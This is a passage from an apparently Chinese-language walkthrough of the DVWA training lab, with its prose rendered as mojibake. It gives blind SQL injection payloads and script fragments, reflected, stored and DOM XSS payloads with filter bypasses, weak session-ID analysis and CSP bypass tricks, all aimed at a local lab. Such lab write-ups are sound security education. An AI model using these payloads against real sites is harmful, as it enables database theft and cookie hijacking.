headers=head).text: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt; 1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) äº²æµ‹ï¼Œæ•ˆæœå¾ˆå¥½ã€‚ mediumè¿™ä¸ªéš¾åº¦ä¸‹è¯·æ±‚æ–¹å¼æ”¹ä¸ºäº†POSTï¼Œæ³¨å…¥æ–¹å¼æ”¹ä¸ºäº†æ•°å­—å‹æ³¨å…¥ï¼Œå¹¶ä¸”åˆ©ç”¨äº†mysql_real_escape_string()å‡½æ•°ä½¿å•å¼•å·è¢«è¿‡æ»¤æ‰äº†ã€‚ä½†ç”±äºä»ç„¶æ²¡æœ‰è¿‡æ»¤å…¶ä»–å…³é”®å­—ï¼Œå› æ­¤payloadæ„å»ºæ–¹å¼å’Œlowéš¾åº¦ä¸‹çš„å·®åˆ«ä¸å¤§ï¼š 12345678æŸ¥åº“payload = &#x27;?id=1 and (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid)æŸ¥è¡¨payload = &#x27;?id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid)æŸ¥åˆ—payload = &#x27;?id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid)æŸ¥æ•°æ®payload = &#x27;?id=1 and (ascii(substr((select group_concat(user,password) from users),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid) å–„ç”¨defå†™è„šæœ¬ï¼Œæ‰€æœ‰é—®é¢˜éƒ½ä¸æ˜¯é—®é¢˜ã€‚ highè¿™ä¸ªéš¾åº¦çš„æäº¤é¡µå’Œç»“æœé¡µåˆ†ç¦»ï¼Œæœ€é‡è¦çš„æ˜¯ï¼ŒæœåŠ¡å™¨ä¼šéšæœºæ‰§è¡Œsleep()å‡½æ•°ï¼Œæ—¶é—´ä¸º2-4ç§’ï¼Œå› æ­¤è¿™ä¸ªéš¾åº¦ä¸‹å¦‚æœä½¿ç”¨æ—¶é—´ç›²æ³¨çš„è¯æ•ˆç‡è¾ƒä½ï¼Œå› æ­¤æˆ‘ä»¬ä»ç„¶é€‰æ‹©å¸ƒå°”ç›²æ³¨ã€‚ å½“ç„¶ä»”ç»†è§‚å¯Ÿè¿™ä¸ªcookieï¼Œæˆ‘ä»¬ä¼šå‘ç°idçš„å€¼ä¹Ÿå†™äº†è¿›å»ï¼Œå› æ­¤è¿™é¢˜åœ¨å†™è„šæœ¬æ—¶ï¼Œè¦æ³¨æ„æ³¨å…¥çš„æ˜¯headersï¼Œpayloadä¸lowä¸­çš„ä¸€è‡´ï¼ŒåŒæ ·å–„ç”¨defè§£å†³ä¸€åˆ‡ã€‚ impossibleé¢„ç¼–è¯‘ã€æ£€æµ‹idã€tokenæ£€æµ‹ï¼Œå’Œä¸Šä¸€å…³ä¸€æ ·æ— æ‡ˆå¯å‡»ï¼ˆ Weak Session IDså…³äºSessionçš„åŸç†å’ŒåŠŸèƒ½ä¹‹å‰çš„åšå®¢æœ‰è¿›è¡Œè¿‡æ¢è®¨ï¼Œæˆ‘ä»¬çŸ¥é“Sessionçš„æ ¸å¿ƒåŠŸèƒ½æ˜¯éªŒè¯ï¼Œå¦‚æœå¯¹ç”Ÿæˆçš„Sessionæ²¡æœ‰æ— è§„å¾‹æ€§ä¸ä¸å¯é€†æ€§ï¼Œé‚£ä¹ˆå°±æå…¶å®¹æ˜“è¢«äººä¼ªé€ ï¼Œé€ æˆä¸¥é‡åæœã€‚ low1234567891011121314vulnerabilities/weak_id/source/low.php&lt;?php$html = &quot;&quot;;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;) &#123; if (!isset ($_SESSION[&#x27;last_session_id&#x27;])) &#123; $_SESSION[&#x27;last_session_id&#x27;] = 0; &#125; $_SESSION[&#x27;last_session_id&#x27;]++; $cookie_value = $_SESSION[&#x27;last_session_id&#x27;]; setcookie(&quot;dvwaSession&quot;, $cookie_value);&#125;?&gt; æ¯æ¬¡è®¿é—®éƒ½ä»…å¯¹ä¸Šä¸€æ¬¡çš„SessionåŠ 1å¤„ç†ï¼Œå¦‚æœè¿™æ ·å¤„ç†Sessionçš„è¯å¾ˆå®¹æ˜“å¯¼è‡´é»‘å®¢é€šè¿‡éå†Sessionè¿›è¡Œæ”»å‡»ã€‚ medium123456789&lt;?php$html = &quot;&quot;;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;) &#123; $cookie_value = time(); setcookie(&quot;dvwaSession&quot;, $cookie_value);&#125;?&gt; ä½¿ç”¨æ—¶é—´æˆ³æ¥ç”ŸæˆSessionï¼Œç¡®å®æé«˜äº†ä¸€å®šçš„å®‰å…¨æ€§ï¼Œä½†æ—¶é—´æˆ³åŒæ ·æ˜¯æœ‰è§„å¾‹çš„ï¼Œç°åœ¨æœ‰å¾ˆå¤šçš„å·¥å…·å¯ä»¥ç›´æ¥ç ´è§£æ—¶é—´æˆ³ï¼Œå› æ­¤æ—¶é—´æˆ³æ¥ç”ŸæˆSessionä¾ç„¶æ˜¯ä¸å®‰å…¨çš„ã€‚ high1234567891011121314&lt;?php$html = &quot;&quot;;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;) &#123; if (!isset ($_SESSION[&#x27;last_session_id_high&#x27;])) &#123; $_SESSION[&#x27;last_session_id_high&#x27;] = 0; &#125; $_SESSION[&#x27;last_session_id_high&#x27;]++; $cookie_value = md5($_SESSION[&#x27;last_session_id_high&#x27;]); setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#x27;HTTP_HOST&#x27;], false, false);&#125;?&gt; setcookie(name,value,expire,path,domain,secure,httponly) name å¿…éœ€ã€‚è§„å®šcookieçš„åç§°ã€‚ value å¿…éœ€ã€‚è§„å®šcookieçš„å€¼ã€‚ expire å¯é€‰ã€‚è§„å®šcookieçš„æœ‰æ•ˆæœŸã€‚ path å¯é€‰ã€‚è§„å®šcookieçš„æœåŠ¡å™¨è·¯å¾„ã€‚ domain å¯é€‰ã€‚è§„å®šcookieçš„åŸŸåã€‚ secure å¯é€‰ã€‚è§„å®šæ˜¯å¦é€šè¿‡å®‰å…¨çš„HTTPSè¿æ¥æ¥ä¼ cookieã€‚ httponly å¯é€‰ã€‚è§„å®šæ˜¯å¦Cookieä»…å¯é€šè¿‡HTTPåè®®è®¿é—®ã€‚ ä¸ä»…ä½¿ç”¨åˆ°äº†åŠ 1ï¼ŒåŒæ—¶è¿˜ä½¿ç”¨md5è¿›è¡ŒåŠ å¯†ï¼Œè¿™ç§åŠ å¯†æœ‰äº†ä¸€å®šçš„ä¸å¯é€†æ€§ï¼Œä½†æ˜¯è¿˜æ˜¯èƒ½è¢«ç ´è§£çš„ï¼Œå› ä¸ºä»ç„¶å­˜åœ¨è§„å¾‹ã€‚ impossible123456789&lt;?php$html = &quot;&quot;;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;) &#123; $cookie_value = sha1(mt_rand() . time() . &quot;Impossible&quot;); setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#x27;HTTP_HOST&#x27;], true, true);&#125;?&gt; éšæœºæ•°ã€æ—¶é—´æˆ³ã€sha1åŠ å¯†ä¸€èµ·ä¸Šï¼ŒçœŸæ­£åšåˆ°äº†æ— è§„å¾‹æ€§ä¸ä¸å¯é€†æ€§ã€‚ DOM Based Cross Site Scripting (XSS)12345678910111213141516171819202122&lt;div class=&quot;vulnerable_code_area&quot;&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123; var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&#x27;&quot; + lang + &quot;&#x27;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;); &#125; document.write(&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt; &lt;/form&gt; &lt;/div&gt; è¿™å°±æ˜¯è¿™ä¸€å…³çš„htmlä»£ç  lowè¿™ä¸ªéš¾åº¦ä¸‹å‰åç«¯éƒ½æ²¡æœ‰è¿›è¡Œä»»ä½•çš„è¿‡æ»¤ã€‚htmlä¸­çš„langå˜é‡é€šè¿‡document.location.hrefæ¥è·å–åˆ°ï¼Œå¹¶ä¸”åœ¨è§£ç åç›´æ¥è¾“å‡ºåˆ°optionä¸­ã€‚å› æ­¤æˆ‘ä»¬æ„å»ºpayloadï¼š 1http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(document.cookie)&lt;/script&gt; mediumæ·»åŠ äº†phpåç«¯è¿‡æ»¤ï¼ŒæŸ¥æ‰¾&lt;scriptå­—ç¬¦ä¸²åœ¨defaultå˜é‡å€¼ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œå¦‚æœåŒ¹é…åˆ™æ‰‹åŠ¨å°†defalutæ”¹æˆEnglishã€‚ è¿™é‡Œæˆ‘ä»¬å°±ä¸èƒ½ç›´æ¥å†™å…¥JSè„šæœ¬äº†ï¼Œè¿™ä¸ªéš¾åº¦ä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡é—­åˆæ ‡ç­¾æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š 1http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(document.cookie)&gt; imgæ ‡ç­¾ä¸­çš„srcå›¾ç‰‡åŠ è½½å¤±è´¥ï¼ŒåŸæ¥çš„å›¾ç‰‡ä½ç½®ä¼šå‡ºç°ä¸€ä¸ªç¢ç‰‡å›¾æ ‡.å¯ä»¥å€Ÿç”¨imgæ ‡ç­¾çš„onerroräº‹ä»¶ï¼Œimgæ ‡ç­¾æ”¯æŒonerror äº‹ä»¶ï¼Œåœ¨è£…è½½æ–‡æ¡£æˆ–å›¾åƒçš„è¿‡ç¨‹ä¸­å¦‚æœå‘ç”Ÿäº†é”™è¯¯ï¼Œå°±ä¼šè§¦å‘onerroräº‹ä»¶ã€‚ è¿™é‡ŒåŒæ ·å¯ä»¥ä½¿ç”¨å…¶ä»–ç±»ä¼¼çš„è¯­å¥è¿›è¡Œæ”»å‡»ï¼Œä¾‹å¦‚&lt;iframe onload=alert(document.cookie)&gt;ç­‰ã€‚ highè¿™ä¸ªéš¾åº¦ä¸‹åç«¯å¯¹defalutçš„å€¼è¿›è¡Œäº†ç™½åå•åŒ¹é…ï¼š 1234567891011121314151617181920&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; # White list the allowable languages switch ($_GET[&#x27;default&#x27;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt; ä½†æ˜¯è¿™ä¸ªç™½åå•åªæ£€æµ‹äº†defalutçš„å€¼ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨&amp;è¿æ¥å¦ä¸€ä¸ªè‡ªå®šä¹‰å˜é‡æˆ–è€…ç”¨#å€ŸåŠ©æ³¨é‡Šè¿›è¡Œç»•è¿‡ï¼š 123http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English&amp;a=&lt;script&gt;alert(document.cookie)&lt;/script&gt;http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English #&lt;script&gt;alert(document.cookie)&lt;/script&gt; impossibleæˆ‘ä»¬åœ¨URLä¸­æ³¨å…¥çš„è¯­å¥ç›´æ¥ä¸è§£ç äº†ï¼Œé‚£è¿™ä¸ç®¡æ€æ ·è‚¯å®šéƒ½æ— æ³•æ³¨å…¥äº†ã€‚ Reflected Cross Site Scripting (XSS)1234567891011121314&lt;div class=&quot;body_padded&quot;&gt; &lt;h1&gt;Vulnerability: Reflected Cross Site Scripting (XSS)&lt;/h1&gt; &lt;div class=&quot;vulnerable_code_area&quot;&gt; &lt;form name=&quot;XSS&quot; action=&quot;#&quot; method=&quot;GET&quot;&gt; &lt;p&gt; What&#x27;s your name? &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/p&gt; &lt;/form&gt; &lt;pre&gt;Hello 1111&lt;/pre&gt; &lt;/div&gt; è¿™æ˜¯æœ¬å…³çš„htmlä»£ç  lowåç«¯å¹¶æ²¡æœ‰å¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä»…ä»…æ£€æµ‹äº†nameçš„å€¼æ˜¯å¦å­˜åœ¨ã€‚å› æ­¤æˆ‘ä»¬ç›´æ¥å†™å…¥æ¶æ„JSè„šæœ¬å°±å¯ä»¥äº†ã€‚ 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; mediumè¿™å…³çš„åç«¯å¯¹&lt;script&gt;è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯ç”±äºç”¨çš„æ˜¯str_replaceå‡½æ•°ä¸”æ²¡æœ‰åŒºåˆ†å¤§å°å†™ï¼Œå› æ­¤è¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨å¤§å°å†™ä»¥åŠåŒå†™ç»•è¿‡ï¼ŒåŒæ ·å¯¹ä¸Šä¸€å…³mediuméš¾åº¦ä¸‹å‡ ä¸ªæ–¹æ³•ä¹ŸåŒæ ·é€‚ç”¨ï¼š 12345&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/script&gt;&lt;img src=x onerror=alert(document.cookie)&gt;&lt;iframe onload=alert(document.cookie)&gt;â€¦â€¦ highè¿™æ¬¡åç«¯çš„å¯¹&lt;script&gt;è¿‡æ»¤çš„è¿‡æ»¤æ›´åŠ ä¸¥æ ¼ï¼Œå¤§å°å†™å’ŒåŒå†™éƒ½æ— æ³•æˆåŠŸç»•è¿‡ã€‚ä¸è¿‡æ—¢ç„¶ç»•ä¸è¿‡å°±æ²¡å¿…è¦ç»•è¿‡äº†ï¼Œä¸ç”¨åˆ°&lt;script&gt;å°±å¯ä»¥äº†ï¼š 123&lt;img src=x onerror=alert(document.cookie)&gt;&lt;iframe onload=alert(document.cookie)&gt;â€¦â€¦ impossiblenameå˜é‡é€šè¿‡htmlspecialchars()å‡½æ•°è¢«HTMLå®ä½“åŒ–åè¾“å‡ºåœ¨äº†&lt;pre&gt;æ ‡ç­¾ä¸­,è¿™ä¸ªæƒ…å†µå¹¶æ²¡æœ‰ä»€ä¹ˆç»•è¿‡æ–¹æ³•ã€‚ Stored Cross Site Scripting (XSS)ç”±äºæ˜¯å‚¨å­˜å‹XSSï¼Œæ‰€ä»¥è¦è®°å¾—åœ¨æ³¨å…¥ååŠæ—¶åˆ é™¤ï¼Œä¸ç„¶ä¼šå½±å“åé¢éš¾åº¦çš„æ³¨å…¥ã€‚ 1234567891011121314151617181920212223242526&lt;div class=&quot;body_padded&quot;&gt; &lt;h1&gt;Vulnerability: Stored Cross Site Scripting (XSS)&lt;/h1&gt; &lt;div class=&quot;vulnerable_code_area&quot;&gt; &lt;form method=&quot;post&quot; name=&quot;guestform&quot; &quot;&gt; &lt;table width=&quot;550&quot; border=&quot;0&quot; cellpadding=&quot;2&quot; cellspacing=&quot;1&quot;&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;Name *&lt;/td&gt; &lt;td&gt;&lt;input name=&quot;txtName&quot; type=&quot;text&quot; size=&quot;30&quot; maxlength=&quot;10&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;Message *&lt;/td&gt; &lt;td&gt;&lt;textarea name=&quot;mtxMessage&quot; cols=&quot;50&quot; rows=&quot;3&quot; maxlength=&quot;50&quot;&gt;&lt;/textarea&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td&gt; &lt;input name=&quot;btnSign&quot; type=&quot;submit&quot; value=&quot;Sign Guestbook&quot; onclick=&quot;return validateGuestbookForm(this.form);&quot; /&gt; &lt;input name=&quot;btnClear&quot; type=&quot;submit&quot; value=&quot;Clear Guestbook&quot; onClick=&quot;return confirmClearGuestbook();&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;/div&gt; è¿™æ˜¯è¿™å…³çš„htmlæºç  lowè¿™ä¸ªé¡µé¢çœ‹èµ·æ¥å°±å¾ˆåƒç•™è¨€æ¿äº†ï¼Œåç«¯ä¹Ÿæ˜¯æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨massageä¸­å†™å…¥æ¶æ„JSè„šæœ¬ï¼š mediumä¾ç„¶æ˜¯ä¸ä¸¥æ ¼çš„str_replace()ï¼Œè€Œä¸”è¿™æ¬¡çš„æ³¨å…¥ç‚¹åœ¨nameä¸­ï¼ŒåµŒå¥—ã€å¤§å°å†™ã€æ ‡ç­¾ç­‰æ–¹æ³•å°±å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯å†™å…¥JSæ—¶å‘ç°å­—ç¬¦é•¿åº¦è¢«é™åˆ¶äº†ï¼Œé‚£å°±è¦é€šè¿‡bpæŠ“åŒ…æ¥è¿›è¡Œæ³¨å…¥äº†ï¼š highæ³¨å…¥ç‚¹ä¾ç„¶æ˜¯åœ¨nameä¸­ï¼Œå¹¶ä¸”å¯¹&lt;script&gt;è¿›è¡Œäº†ä¸¥æ ¼è¿‡æ»¤ï¼Œä¾ç„¶æœ‰å­—ç¬¦é™åˆ¶ï¼Œé‚£ä¹ˆä¾ç„¶æ˜¯æŠ“åŒ…è¿›è¡Œæ³¨å…¥ï¼Œä½¿ç”¨æ ‡ç­¾å°±å¯ä»¥äº†ï¼š impossibleå¯¹nameå’Œmassageéƒ½è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¹¶ä¸”è®¾ç½®äº†tokenè¿›è¡ŒéªŒè¯ï¼ŒåŒæ—¶æœ‰æ•ˆé˜²æ­¢äº†XSSå’ŒCSRFã€‚ Content Security Policy (CSP) BypassCSPç®€å•ç†è§£å°±æ˜¯ç™½åå•ï¼Œæ˜¯æµè§ˆå™¨çš„å®‰å…¨ç­–ç•¥ã€‚å¦‚æœæ ‡ç­¾æˆ–æœåŠ¡å™¨ä¸­è¿”å›çš„HTTPå¤´ä¸­æœ‰Content-Security-Policyæ ‡ç­¾ï¼Œæµè§ˆå™¨å°±ä¼šæ ¹æ®å…¶åˆ¤æ–­å“ªäº›ç½‘é¡µèµ„æºå¯ä»¥è¢«è§£ææ‰§è¡Œã€‚CSPæå¤§æå‡äº†ç½‘é¡µçš„å®‰å…¨æ€§ï¼Œé’ˆå¯¹XSSèµ·åˆ°äº†æå¤§ä½œç”¨ã€‚å…³äºè¿™ä¸€å…³çš„å…·ä½“åŸç†ç­‰æ–¹é¢ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™äº›åšå®¢ï¼šContent Security Policy å…¥é—¨æ•™ç¨‹CSPç­–ç•¥ä¸ç»•è¿‡ lowæŸ¥çœ‹åç«¯phpæˆ–è€…htmlå¤´éƒ½å¯ä»¥å‘ç°å…è®¸åŒ…å«çš„urlä¸ºselfã€pastebin.comã€hastebin.comã€jqueryå’Œgoogle analyticsã€‚æˆ‘ä»¬ä¾æ¬¡è®¿é—®ï¼ˆéœ€è¦é­”æ³•ä¸Šç½‘ï¼‰å¯ä»¥å‘ç°å…¶ä¸­pastebin.comæ˜¯ä¸€ä¸ªæ–‡æœ¬åˆ†äº«çš„ç½‘ç«™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨è¯¥ç½‘ç«™å†™å…¥ä¸€ä¸ªæ¶æ„JSè„šæœ¬ï¼Œå†é€šè¿‡é¶åœºçš„åŒ…å«å°†JSåŒ…å«è¿›å»ã€‚ å†™å…¥å¹¶åˆ›å»ºæ¶æ„JSè„šæœ¬ï¼Œç„¶åç‚¹å‡»rawç”Ÿæˆurlï¼š æœ€åå›åˆ°DVWAå°†é“¾æ¥å†™å…¥ï¼Œç‚¹å‡»includeå³å¯ï¼Œä¸è¿‡ç”±äºè¿™ä¸ªç½‘ç«™æœåŠ¡å™¨åœ¨ç¾å›½ï¼Œå› æ­¤å¯èƒ½ç”±äºç½‘ç»œé—®é¢˜æ— æ³•å¼¹å‡ºå¼¹çª—ã€‚ mediumæŸ¥çœ‹åç«¯ä»£ç ï¼Œå‘ç°è¿™æ ·ä¸€è¡Œï¼š 1$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;; è¿™é‡Œé¢æ²¡æœ‰å¯ä»¥ç±»ä¼¼äºä¸Šä¸€éš¾åº¦ä¸­å¯ä»¥ç›´æ¥åŒ…å«çš„ç½‘é¡µï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå…³é”®ï¼šnonceã€‚ script-srcæ˜¯å¯ä»¥è®¾ç½®ä¸€äº›ç‰¹æ®Šå€¼çš„ï¼š unsafe-inlineï¼šå…è®¸æ‰§è¡Œé¡µé¢å†…åµŒçš„&lt;script&gt;æ ‡ç­¾å’Œäº‹ä»¶ç›‘å¬å‡½æ•° unsafe-evalï¼šå…è®¸å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ‰§è¡Œï¼Œæ¯”å¦‚ä½¿ç”¨evalã€setTimeoutã€setIntervalå’ŒFunctionç­‰å‡½æ•°ã€‚ nonceï¼šæ¯æ¬¡HTTPå›åº”ç»™å‡ºä¸€ä¸ªæˆæƒtokenï¼Œé¡µé¢å†…åµŒè„šæœ¬å¿…é¡»æœ‰è¿™ä¸ª tokenï¼Œæ‰ä¼šæ‰§è¡Œ hashï¼šåˆ—å‡ºå…è®¸æ‰§è¡Œçš„è„šæœ¬ä»£ç çš„Hashå€¼ï¼Œé¡µé¢å†…åµŒè„šæœ¬çš„å“ˆå¸Œå€¼åªæœ‰å»åˆçš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½æ‰§è¡Œã€‚ps.nonceå€¼å’Œhashå€¼è¿˜å¯ä»¥ç”¨åœ¨style-srcé€‰é¡¹ï¼Œæ§åˆ¶é¡µé¢å†…åµŒçš„æ ·å¼è¡¨ å…ˆä¸¾ä¸€ä¸ªè¿ç”¨åˆ°hashçš„ä¾‹å­:æœåŠ¡å™¨ç»™å‡ºä¸€ä¸ªå…è®¸æ‰§è¡Œä»£ç çš„hashå€¼ 1Content-Security-Policy: script-src &#x27;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&#x27; è¿™æ ·ä¸‹é¢è¿™ä¸ªä»£ç å°±ä¼šè¢«å…è®¸æ‰§è¡Œ,å› ä¸ºhashå€¼ç›¸åŒï¼ˆä¸åŒ…æ‹¬&lt;script&gt;æ ‡ç­¾ï¼‰ 1&lt;script&gt;alert(&#x27;Hello, world.&#x27;);&lt;/script&gt; å›åˆ°é¢˜ç›®ï¼Œè¿™é‡Œä½¿ç”¨äº†unsafe-inlineå’Œnonceï¼Œå› æ­¤é¡µé¢å†…åµŒè„šæœ¬ï¼Œä¸”å¿…é¡»æœ‰tokenæ‰èƒ½æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºJSï¼š 1&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(document.cookie)&lt;/script&gt; highåç«¯phpçš„CSPåœ¨è¿™é‡Œåªå…è®¸selfï¼Œå³æœ¬é¡µåŠ è½½çš„è„šæœ¬è¿è¡Œã€‚æˆ‘ä»¬ç‚¹å‡»Slove the SumæŒ‰é’®ï¼Œå‘ç°htmlä¸­å¤šå‡ºæ¥äº†ä¸€è¡Œï¼š 1&lt;script src=&quot;source/jsonp.php?callback=solveSum&quot;&gt;&lt;/script&gt; è¯´æ˜è¿™é‡Œè§¦å‘äº†JSï¼Œæˆ‘ä»¬æŸ¥çœ‹åç«¯JSä¼šå‘ç°æœ‰ä¸€ä¸ªhigh.jsæ–‡ä»¶ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªæ–‡ä»¶å’Œhtmlä¸­çš„éƒ¨åˆ†ä»£ç ç»“åˆèµ·æ¥ï¼š 123456789101112131415161718192021222324252627282930//high.jsfunction clickButton() &#123; var s = document.createElement(&quot;script&quot;); s.src = &quot;source/jsonp.php?callback=solveSum&quot;; document.body.appendChild(s);&#125;function solveSum(obj) &#123; if (&quot;answer&quot; in obj) &#123; document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;]; &#125;&#125;var solve_button = document.getElementById (&quot;solve&quot;);if (solve_button) &#123; solve_button.addEventListener(&quot;click&quot;, function() &#123; clickButton(); &#125;);&#125;//html&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;The page makes a call to ../..//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;&lt;/form&gt; &lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt; å½“æŒ‰ä¸‹æŒ‰é’®åï¼Œè§¦å‘id=&quot;slove&quot;ï¼Œå³è§¦å‘clickäº‹ä»¶ä½¿å¾—clickButton()æ‰§è¡Œï¼Œä½¿å¾—ä¸€ä¸ªæ–°çš„&lt;script&gt;æ ‡ç­¾ä½œä¸º&lt;body&gt;ä¸­çš„å­å…ƒç´ å†™å…¥ï¼Œå†…å®¹æ˜¯src = &quot;source/jsonp.php?callback=solveSum&quot;ï¼Œå› æ­¤æˆ‘ä»¬ä¼šå‘ç°htmlä¸­å¤šå‡ºäº†ä¸€è¡Œï¼š è¿™æ ·æµè§ˆå™¨å°±ä¼šå‘èµ·è¯·æ±‚ï¼š 1http://127.0.0.1/vulnerabilities/csp/source/jsonp.php?callback=solveSum æˆ‘ä»¬æ¥è®¿é—®ä¸€ä¸‹è¿™ä¸ªurlï¼šæµè§ˆå™¨æ”¶åˆ°è¯·æ±‚è¿‡åæ”¶åˆ°answerå€¼ï¼Œè¿™ä¸ªå€¼é€šè¿‡solveSum()è¿”å›åˆ°é¡µé¢ä¸­ï¼Œå¾—åˆ°äº†15. é‚£ä¹ˆäº†è§£åˆ°æ•´ä¸ªåŸç†ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ€è€ƒæ³¨å…¥æ–¹å¼äº†ã€‚æˆ‘ä»¬çŸ¥é“å½“callback=solveSumæ—¶è§¦å‘äº†è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥è‡ªå·±å†™å…¥ä¸€ç‚¹ä¸œè¥¿è¿›å»ï¼Œä¾‹å¦‚ï¼š 1?callback=alert(documemt.cookie) æˆ‘ä»¬å‘ç°è¿™æ ·JSå°±è¢«å†™å…¥äº†ï¼Œä½†æ˜¯æˆ‘ä»¬åº”è¯¥å¦‚ä½•æ³¨å…¥å‘¢ï¼Œæˆ‘ä»¬å‘ç°åç«¯phpä¸­æœ‰è¿™ä¹ˆä¸€è¡Œï¼š 123456&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125; POSTæäº¤çš„includeå‚æ•°ä¼šåŒ…å«åˆ°&lt;body&gt;ä¸­ï¼Œå±…ç„¶è¿˜æœ‰è¿™ç§å¥½äº‹ï¼šæˆåŠŸã€‚ impossibleåç«¯phpé™åˆ¶äº†è¾“å‡ºï¼Œè¿™æ„å‘³ç€åªèƒ½å›è°ƒJSä¸­çš„solveSum()ï¼Œç›¸å½“äºç›´æ¥å°†JSONPé™åˆ¶æ­»äº†ï¼Œå› æ­¤ä¸å­˜åœ¨æ³¨å…¥å¯èƒ½ã€‚ JavaScript 